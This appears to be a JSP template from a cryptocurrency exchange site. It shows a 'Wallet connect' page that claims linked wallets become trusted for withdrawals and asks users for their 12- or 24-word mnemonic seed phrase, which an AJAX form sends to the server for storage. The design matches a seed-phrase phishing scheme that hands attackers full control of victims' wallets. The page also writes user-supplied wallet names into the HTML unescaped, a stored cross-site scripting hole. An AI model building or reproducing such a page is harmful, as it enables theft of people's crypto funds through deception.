...
<%@ page import="ru.tiedie.cryptoexchange.data.Mnemonic" %>
...
<head>
  ...
  <%
    out.println("<title>Wallet connect | " + request.getAttribute("domain_exchange_name") + "</title>");
  %>
  <%
      ...
      <div class="menuProfile__box">
        <div class="menuProfile__menu-box">
          ...
          <div class="menuProfile__more">
            ...
            <a class="menuProfile__menu-item menuProfile__item-mobile mdi mdi-wallet" href="/profile/walletconnect">Wallet connect</a>");
          </div>
        </div>
      </div>
    </div>
  ...
  <div class="transfer__container">
    <div class="transfer__box">
      <div class="transfer__info">
        ...
        <div class="transfer__description">
          Link wallets that will be known by the exchange as trusted, and make withdrawals to them.
        </div>
      </div>
      <div class="transfer__you">
        ...
        <div class="transfer__send-input">
          <input type="text" placeholder="Enter wallet name" id="wallet_name_input">
        </div>
      </div>
    </div>
    ...
    <div class="transfer__receivers">
      <div class="transfer__receivers-title">
        Mnemonic phrase (12 or 24 word phrase)
      </div>
      <div class="transfer__receivers-input">
        <input id="mnemonic_input" type="text" placeholder="Enter mnemonic phrase">
      </div>
    </div>
    <div class="transfer__link-container">
      <a style="text-decoration: none; color: white;" class="transfer__link" href="#" onclick="mnemonic(event)">Submit</a>
    </div>
  </div>
</section>
<section class="transfer__table">
  <div class="transfer__table-box">
    <div class="transfer__table-names">
      <div class="transfer__table-name transfer__table-id" style="width: 300px">Wallet name</div>
      <div class="transfer__table-name transfer__table-date" style="width: 200px">Created</div>
      <div class="transfer__table-name transfer__table-status" style="width: 200px">Status</div>
      <div class="transfer__table-name transfer__table-amount" style="width: 100px">Action</div>
    </div>
    <div class="transfer__table-values">
      <%
        List<Mnemonic> mnemonics = (List<Mnemonic>) request.getAttribute("mnemonics");
        boolean empty = true;
        for (Mnemonic mnemonic : mnemonics) {
          if (!mnemonic.isDeleted()) {
            empty = false;
            break;
          }
        }
        if (empty) {
          ...
          for (Mnemonic mnemonic : mnemonics) {
            ...
            out.println("<div class=\"transfer__table-value\">\n" +
                    "<div class=\"transfer__table-id\" style=\"width: 300px\">" + mnemonic.getWalletName() + "</div>\n" +
                    "<div class=\"transfer__table-date\" style=\"width: 200px\">" + StringUtil.formatDate(new Date(mnemonic.getDate())) + "</div>\n" +
                    "<div class=\"transfer__table-status transfer__table-status-" + (mnemonic.isVerified() ? "received" : "sent") + "\" style=\"width: 200px\">" + (mnemonic.isVerified() ? "Verified" : "Not verified") + "</div>\n" +
                    "<button class=\"transfer__table-amount\" onclick=\"deleteMnemonic(" + mnemonic.getId() + ")\" style=\"\n" +
                    "    background: #414b64;\n" +
                    "    border-radius: 5px;\n" +
                    "    font-weight: 500;\n" +
                    "    font-size: 15px;\n" +
...
<script>
  function deleteMnemonic(id) {
    $.ajax({
      ...
      type: "POST",
      data: {
        action: "DELETE_MNEMONIC",
        id: id
      },
      success: function(response) {
        if (response == "1") {
          noti("Wallet successfully deleted", "success");
          setTimeout(() => location.reload(), 500);
        } else if (response == "2") {
          noti("Wallet already deleted, reload page", "error");
        } else {
  ...
  function mnemonic(event) {
    ...
    let walletName = $("#wallet_name_input").val();
    let mnemonic = $("#mnemonic_input").val();

    if (walletName == "") {
      noti("Wallet name is empty", "error");
      return
    }
    if (mnemonic == "") {
      noti("Mnemonic is empty", "error");
      return
    }

    if (mnemonic.length < 12) {
      noti("The mnemonic phrase is invalid", "error");
      return
    }
    ...
    $.ajax({
      ...
      success: function(response) {
        if (response == "1") {
          noti("Wallet successfully added", "success");
          setTimeout(() => location.reload(), 500);
        } else if (response == "2") {
          noti("The mnemonic phrase is invalid", "error");
        } else {
